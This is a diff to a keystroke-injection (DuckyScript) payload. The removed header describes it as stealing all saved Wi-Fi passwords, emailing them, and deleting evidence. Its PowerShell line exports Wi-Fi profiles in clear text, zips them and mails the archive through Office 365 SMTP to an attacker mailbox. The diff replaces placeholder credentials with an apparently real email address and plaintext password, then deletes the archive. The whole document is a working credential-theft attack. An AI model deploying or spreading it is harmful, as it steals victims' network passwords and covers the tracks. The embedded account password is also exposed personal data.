@@ -1,7 +1,3 @@
-REM Author: Ramtin
-REM Description: Steals all of the saved Wifi Passwords and sends them as an email attachment, then delete evidence.
-REM Version: 2.0
-REM Category: Passwords
 
 DELAY 500
 WINDOWS d
@@ -18,6 +14,6 @@ ALT y
 DELAY 500
 GUI UP
 DELAY 600
-STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\WIFIPASSWORDS ' + $folderDateTime;New-Item -ItemType Directory -Path $userDir;netsh wlan export profile key=clear folder=$userDir;Compress-Archive -Path $userDir -DestinationPath $userDir\ResultsPassword.zip;$password = ConvertTo-SecureString "passwordHERE" -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ("YOURMAIL@outlook.com", $password);Send-MailMessage -To "YOURMAIL@outlook.com" -From "YOURMAIL@outlook.com" -Subject "Wifi Passwords Report - $userDir" -Body "Attached is the report containing all saved Wifi passwords from $userDir." -Attachments "$userDir\ResultsPassword.zip" -SmtpServer "smtp.office365.com" -Port 587 -Credential $cred -UseSsl'
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\WIFIPASSWORDS ' + $folderDateTime;New-Item -ItemType Directory -Path $userDir;netsh wlan export profile key=clear folder=$userDir;Compress-Archive -Path $userDir -DestinationPath $userDir\ResultsPassword.zip;$password = ConvertTo-SecureString "Lazerman808" -AsPlainText -Force;$cred = New-Object System.Management.Automation.PSCredential ("eliasbalinbin808@hotmail.com", $password);Send-MailMessage -To "eliasbalinbin808@hotmail.com" -From "eliasbalinbin808@hotmail.com" -Subject "Wifi Passwords Report - $userDir" -Body "Attached is the report containing all saved Wifi passwords from $userDir." -Attachments "$userDir\ResultsPassword.zip" -SmtpServer "smtp.office365.com" -Port 587 -Credential $cred -UseSsl'
 Remove-Item "$userDir\ResultsPassword.zip"
 ENTER
